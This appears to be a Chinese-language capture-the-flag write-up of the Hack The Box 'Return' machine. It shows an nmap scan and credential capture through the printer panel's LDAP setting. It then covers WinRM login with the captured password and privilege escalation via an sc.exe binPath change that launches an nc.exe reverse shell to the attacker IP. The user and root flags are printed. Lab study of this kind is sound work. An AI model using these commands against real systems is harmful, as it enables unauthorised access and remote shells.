掃 port 最好全掃
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-27 03:21:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8562/tcp  filtered unknown
9389/tcp  open     mc-nmf         .NET Message Framing
```

其中可以注意的是 139 跟 445 port 這兩個有 SMB 服務 因此可以透過 `crackmapexec` 去爆破帳號密碼 `crackmapexec` 支援 `ssh,ldap,winrm,ftp,mssql,rdp,smb` 這些協議
但沒有找到東西
```
crackmapexec smb 10.10.11.108 --users  
```
![image](https://hackmd.io/_uploads/SycJwBVQyg.png)

開啟網站可以看到是一個印表機頁面 除了 setting 頁面其他沒東西可以使用
![image](https://hackmd.io/_uploads/BJH3DS4Qyg.png)

透過 burp 可以發現可以修改 ip 的位置 其他的不行
![image](https://hackmd.io/_uploads/HJMk_rNQyx.png)

因此可以透過修改 ip 成自己的位置 並監聽 389 port 看有沒有辦法獲得有用的資訊 成功獲得印表機憑證 `1edFg43012!!` 以及他的 username `svc-printer`
![image](https://hackmd.io/_uploads/SyNvdSNmJl.png)

由於在 nmap 時有發現有開啟 5985 port 也就是 `winrm` 服務 所以也用 `crackmapexec` 去探查看看  可以發現是可以做登入連線的

```
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

![image](https://hackmd.io/_uploads/rkUAkUNmye.png)

此時可以利用 [evil-winrm](https://jtz.gitbook.io/web-security/gong-ju/duan-kou-fu-wu/5985-5986-winrm/evil-winrm) 進行連線 成功登入
```
evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```
![image](https://hackmd.io/_uploads/r19LZU4Xkg.png)

成功在 `desktop` 取得 `user.txt` : `10d781215e3d005c179f118a83b11e15`
![image](https://hackmd.io/_uploads/B1LeGIVmyg.png)

使用 `whoami /priv` 查看有哪些權限是我們當前用戶可以使用的
![image](https://hackmd.io/_uploads/B1q2SUEQyl.png)

查看此 user 資料發現有修改重啟系統的權限 那這時可以利用 `sc.exe` 對系統的二進制文件作修改
```
net user svc-printer
```
![image](https://hackmd.io/_uploads/ry27FUN71x.png)

這裡的原理是利用有修改重啟的權限 因此去修改服的二進制文件把 path 改成我們的 reverse shell 這樣重啟時啟動的就不是原本的程式 變成啟動 nc.exe 我們的監聽就可以聽到了

先使用 `services` 看有開啟的服務
![image](https://hackmd.io/_uploads/HyDhkPEmye.png)

使用以下 payload 去修改路徑
```
sc.exe config WMPNetworkSvc binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.15.39 4444"
```

可能會被 denied 找出可以修改的
![image](https://hackmd.io/_uploads/H1DrxwN7ke.png)

在 `VGAuthService` 成功修改路徑
![image](https://hackmd.io/_uploads/HkzigPVXJx.png)

重啟服務
```
sc.exe stop VGAuthService
sc.exe start VGAuthService
```

成功在 `C:\Users\Administrator\Desktop` 找到 flag : `eddb7d393ebc2b1959cfb416348cfd96`
![image](https://hackmd.io/_uploads/SkAEfPEQJe.png)

但速度要快 不然 30 秒後 time-out 又要重新連線一次
